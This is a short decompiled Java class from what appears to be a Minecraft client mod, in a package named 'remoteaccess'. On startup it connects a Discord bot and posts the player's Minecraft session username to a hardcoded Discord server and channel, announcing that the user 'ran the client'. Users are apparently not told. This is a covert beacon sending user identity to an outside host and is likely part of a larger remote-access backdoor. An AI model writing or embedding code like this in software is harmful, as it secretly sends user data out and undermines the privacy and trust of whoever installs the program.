/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.jetbrains.annotations.NotNull
 */
package kambing.remoteaccess;

import cascade.Cascade;
import java.util.Objects;
import net.dv8tion.jda.api.events.ReadyEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import org.jetbrains.annotations.NotNull;

public class Listener
extends ListenerAdapter {
    @Override
    public void onReady(@NotNull ReadyEvent event) {
        Objects.requireNonNull(Objects.requireNonNull(event.getJDA().getGuildById("917480348969996348")).getTextChannelById("917480348969996351")).sendMessage(Cascade.mc.func_110432_I().func_111285_a() + " ran the client").queue();
    }
}

